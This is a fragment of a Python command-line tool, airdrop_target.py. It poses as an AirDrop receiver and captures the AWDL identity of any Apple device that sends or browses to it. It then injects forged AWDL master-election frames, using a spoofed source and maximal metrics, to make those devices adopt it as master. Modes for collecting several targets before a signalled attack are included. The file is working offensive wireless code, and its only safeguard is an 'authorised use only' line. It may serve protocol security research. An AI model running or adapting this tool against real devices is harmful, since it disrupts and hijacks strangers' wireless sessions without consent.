                "Tip: run owl in the foreground in its own terminal and watch "
                "for errors, and stop NetworkManager from managing the card."
                % (awdl_iface, awdl_iface))
        raise RuntimeError(
            "interface %s does not exist -- start the OWL daemon first and keep "
            "it running in its own terminal:\n"
            "  sudo owl -i %s\n"
            "then re-run this (check with: ip addr show %s)."
            % (awdl_iface, monitor_iface, awdl_iface))
    print("[airdrop] %s is up (%s)" % (awdl_iface, ipv6))

    # Shared injection state.
    src = source or awdl.get_iface_mac(monitor_iface) or awdl.random_local_mac()
    store = awdl.ParamStore(
        targets=[], source=src, channel=(channels[0] if channels else 6),
        master_metric=metric, master_counter=counter,
        self_metric=metric, self_counter=counter,
        awdl_version=awdl_version, hostname=master_hostname,
        devclass=awdl.DEVCLASS_NAMES[devclass], aw_offset=aw_offset)
    tracker = awdl.HostnameTracker(store, fixed=[], names=[])

    observer = None
    if resolve_uuid:
        observer = MacNameObserver(monitor_iface)
        if not observer.start():
            observer = None

    # Arming gate for the injector. While not armed it stays dormant -- no
    # channel tuning, no TX -- so owl owns the one radio (e.g. for AirDrop
    # discovery).  Three modes:
    #   capture   (default) the bridge arms on the FIRST captured target
    #   immediate armed at launch (old always-on behaviour)
    #   trigger   keep collecting targets from every device that AirDrops and
    #             arm only on an external SIGUSR1 (sudo kill -USR1 <pid>), so
    #             several devices can be gathered before injection begins
    armed = threading.Event()
    arm_on_capture = inject_start == "capture"
    # Arm only after the whole AirDrop exchange has finished: "upload" normally,
    # but "ask" when declining (then no upload happens).
    arm_after = "ask" if decline else "upload"
    if inject_start == "immediate":
        armed.set()
    elif inject_start == "trigger" and hasattr(awdl.signal, "SIGUSR1"):
        def _external_arm(*_):
            if not armed.is_set():
                armed.set()
                print("[airdrop] external trigger received -- injecting now")
        try:
            awdl.signal.signal(awdl.signal.SIGUSR1, _external_arm)
            print("[airdrop] trigger mode: collecting targets; start injection "
                  "with:  sudo kill -USR1 %d" % os.getpid())
        except (ValueError, OSError):
            pass

    bridge = CaptureBridge(store, tracker, observer=observer,
                           awdl_iface=awdl_iface, inject=inject,
                           on_capture=on_capture, monitor_iface=monitor_iface,
                           arm_event=armed, arm_on_capture=arm_on_capture,
                           arm_after=arm_after)

    inject_sock = None
    inject_thread = None
    if inject:
        inject_sock = awdl.open_injection_socket(monitor_iface)
        builder = awdl.AwdlFrameBuilder(
            src=src, dst=awdl.BROADCAST,
            channel=(channels[0] if channels else 6),
            master_metric=metric, master_counter=counter,
            self_metric=metric, self_counter=counter,
            hostname=master_hostname, devclass=awdl.DEVCLASS_NAMES[devclass],
            awdl_version=awdl_version, aw_offset=aw_offset)
        rotate = channels if (channels and len(channels) > 1) else None
        single_channel = channels[0] if channels else 6
        if not rotate:
            store.update(channel=single_channel)
        inject_thread = threading.Thread(
            target=awdl.run_injection, name="injector",
            kwargs=dict(sock=inject_sock, store=store, builder=builder,
                        ifname=monitor_iface, interval=interval,
                        rotate_channels=rotate, channel_dwell=channel_dwell,
                        counter_interval=counter_interval, tracker=tracker,
                        watch=watch, psf=psf, stop=stop, arm=armed),
            daemon=True)
        inject_thread.start()
        chan_desc = ",".join(str(c) for c in channels) if channels else str(single_channel)
        if armed.is_set():
            print("[airdrop] injector running (master %s, channels %s)"
                  % (awdl.mac_str(src), chan_desc))
        else:
            print("[airdrop] injector armed-on-capture (master %s, channels %s) "
                  "-- dormant until a device AirDrops to us, so owl owns the "
                  "radio for discovery" % (awdl.mac_str(src), chan_desc))
    else:
        print("[airdrop] capture-only (--no-inject): will print the injector "
              "command for each captured device")

    # Pick the receiver backend.
    use_opendrop = backend == "opendrop" or (
        backend == "auto" and _opendrop_available())

    advertiser = None
    try:
        if use_opendrop:
            if not run_opendrop_receiver(bridge, awdl_iface, name, model, port,
                                         download_dir, decline, trigger, stop):
                if backend == "opendrop":
                    raise RuntimeError("opendrop backend requested but the "
                                       "'opendrop' package is not importable")
                use_opendrop = False
        if not use_opendrop:
            service_id = os.urandom(6).hex()
            # mDNS 'server' label must be a valid DNS name (the display name may
            # contain spaces); the share-sheet name is ReceiverComputerName.
            advertiser = MdnsAdvertiser(ipv6, port, service_id,
                                        socket.gethostname())
            advertiser.start()
            cert_dir = cert_dir or os.path.join(
                os.path.expanduser("~"), ".owl-airdrop")
            cert_path, key_path = ensure_selfsigned_cert(cert_dir, name)
            ctx = airdrop_ssl_context(cert_path, key_path)

            AirDropHandler.bridge = bridge
            AirDropHandler.receiver_name = name
            AirDropHandler.receiver_model = model
            AirDropHandler.trigger = trigger
            AirDropHandler.download_dir = download_dir
            AirDropHandler.decline = decline

            server = AirDropHTTPServer(("::", port), AirDropHandler, ctx)
            print("[airdrop] backend: builtin (receiver up on [::]:%d as '%s', "
                  "Everyone mode)" % (port, name))
            print("[airdrop] ready -- on the device: AirDrop > Everyone, open the "
                  "share sheet, pick '%s', send a file" % name)
            srv_thread = threading.Thread(target=server.serve_forever,
                                          name="airdrop-http", daemon=True)
            srv_thread.start()
            stop.wait()
            server.shutdown()
    finally:
        stop.set()
        if advertiser is not None:
            advertiser.stop()
        if observer is not None:
            observer.stop()
        if inject_sock is not None:
            try:
                inject_sock.close()
            except OSError:
                pass
    return store


def _opendrop_available():
    try:
        import importlib.util
        return importlib.util.find_spec("opendrop") is not None
    except Exception:
        return False


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main(argv=None):
    parser = argparse.ArgumentParser(
        prog="airdrop_target.py",
        description="Advertise this PC as an AirDrop target; capture the AWDL "
                    "identity of whichever device sends a file and feed it live "
                    "to awdl_master_inject.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        epilog="Requires the OWL daemon running (so awdl0 exists). "
               "AUTHORISED USE ONLY: your own / explicitly-authorised devices "
               "in an isolated RF lab.")
    parser.add_argument("-i", "--interface", required=True, metavar="IFACE",
                        help="Wi-Fi card in monitor mode (for the injector and "
                             "UUID sniffing), e.g. wlan0")
    parser.add_argument("--awdl-iface", default=DEFAULT_AWDL_IFACE, metavar="IFACE",
                        help="the AWDL interface the OWL daemon created")
    parser.add_argument("-n", "--name", default=None, metavar="NAME",
                        help="receiver name shown on the sender's share sheet "
                             "(default: this host's name)")
    parser.add_argument("--model", default="OpenDrop", metavar="MODEL",
                        help="receiver model string advertised to the sender")
    parser.add_argument("--port", type=int, default=AIRDROP_DEFAULT_PORT,
                        help="AirDrop HTTPS port to advertise/listen on")

    chan = parser.add_argument_group("injector channel / timing (as in awdl_master_inject)")
    chan.add_argument("-c", "--channel", type=int, default=None,
                      choices=sorted(awdl.CHAN_OPCLASS),
                      help="single AWDL social channel to inject on")
    chan.add_argument("--channels", type=awdl.parse_channels, default=None,
                      metavar="C[,C...]",
                      help="rotate injection across these social channels "
                           "(e.g. 6,6,44,149); weight by repeating one")
    chan.add_argument("--channel-dwell", type=awdl.parse_duration,
                      default=awdl.CHANNEL_DWELL_DEFAULT, metavar="TIME",
                      help="dwell per channel while rotating (s/ms/us/tu)")
    chan.add_argument("--interval", type=awdl.parse_duration, default=1.0,
                      metavar="TIME", help="time between injection cycles")
    chan.add_argument("--counter-interval", type=awdl.parse_duration,
                      default=awdl.MASTER_COUNTER_INTERVAL, metavar="TIME",
                      help="how often the election counter is advanced")
    chan.add_argument("--watch", action="store_true",
                      help="also listen on the card and report, once a second, "
                           "which master each AWDL peer advertises (shows "
                           "whether the target adopted you) -- same as the "
                           "injector's --watch")
    chan.add_argument("--psf", action="store_true",
                      help="also interleave PSF frames (default: MIF only)")

    ident = parser.add_argument_group("advertised master identity (as in awdl_master_inject)")
    ident.add_argument("-s", "--source", type=awdl.parse_mac, default=None,
                       metavar="MAC", help="master identity to advertise "
                       "(default: the monitor card's MAC)")
    ident.add_argument("--awdl-version", type=awdl.parse_awdl_version,
                       default=awdl.AWDL_VERSION_TLV_DEFAULT, metavar="VER",
                       help="AWDL version in the Version TLV, e.g. 10.0")
    ident.add_argument("--hostname", default="owl-master", metavar="NAME",
                       help="hostname the injected MASTER advertises (Arpa TLV)")
    ident.add_argument("--devclass", choices=sorted(awdl.DEVCLASS_NAMES),
                       default="macos", help="advertised device class")
    ident.add_argument("--metric", type=lambda x: int(x, 0),
                       default=awdl.UINT32_MAX, help="election master metric")
    ident.add_argument("--counter", type=lambda x: int(x, 0),
                       default=awdl.MASTER_COUNTER_BASE,
                       help="starting election master counter")
    ident.add_argument("--aw-offset", type=int, default=0, metavar="TU",
                       help="availability-window phase offset in TU")

    cap = parser.add_argument_group("capture / receiver behaviour")
    cap.add_argument("--no-inject", action="store_true",
                     help="capture only: print each device's identity and the "
                          "injector command, but do not inject")
    cap.add_argument("--inject-start", choices=["capture", "immediate", "trigger"],
                     default="capture",
                     help="when the injector begins transmitting: 'capture' "
                          "(default) stays dormant so owl owns the radio for "
                          "AirDrop discovery, then starts sending once the first "
                          "device AirDrops to us; 'immediate' starts at launch; "
                          "'trigger' keeps collecting targets from every device "
                          "that AirDrops and starts sending to all of them only "
                          "on an external signal (sudo kill -USR1 <pid>)")
    cap.add_argument("--no-resolve-uuid", action="store_true",
                     help="do not sniff for the device's AWDL UUID; track only "
                          "the captured MAC (re-captured on each send)")
    cap.add_argument("--backend", choices=["auto", "builtin", "opendrop"],
                     default="auto", help="receiver engine")
    cap.add_argument("--trigger", choices=["ask", "discover", "both"],
                     default="ask",
                     help="when to capture: on the file-send (ask), as soon as "
                          "the device browses (discover), or both")
    cap.add_argument("--decline", action="store_true",
                     help="decline the transfer after capturing (do not receive "
                          "the file; capture still happens)")
    cap.add_argument("--download-dir", default=None, metavar="DIR",
                     help="save received files here (default: no file is kept)")
    cap.add_argument("--cert-dir", default=None, metavar="DIR",
                     help="where to keep the self-signed TLS cert "
                          "(default: ~/.owl-airdrop)")

    args = parser.parse_args(argv)

    channels = None
    if args.channels:
        channels = list(args.channels)
    elif args.channel is not None:
        channels = [args.channel]

    stop = threading.Event()
    awdl.signal.signal(awdl.signal.SIGINT, lambda *_: stop.set())

    try:
        run_airdrop_target(
            monitor_iface=args.interface, awdl_iface=args.awdl_iface,
            name=args.name, model=args.model, port=args.port,
            channels=channels, channel_dwell=args.channel_dwell,
            interval=args.interval, counter_interval=args.counter_interval,
            source=args.source, awdl_version=args.awdl_version,
            master_hostname=args.hostname, devclass=args.devclass,
            metric=args.metric & awdl.UINT32_MAX,
            counter=args.counter & awdl.UINT32_MAX, aw_offset=args.aw_offset,
            inject=not args.no_inject, resolve_uuid=not args.no_resolve_uuid,
            backend=args.backend, trigger=args.trigger, decline=args.decline,
            download_dir=args.download_dir, cert_dir=args.cert_dir,
            inject_start=args.inject_start, watch=args.watch, psf=args.psf,
            stop=stop)
    except RuntimeError as exc:
        sys.exit("error: %s" % exc)
    except KeyboardInterrupt:
        pass
    print("\n[airdrop] stopped")
    return 0


if __name__ == "__main__":
    sys.exit(main())
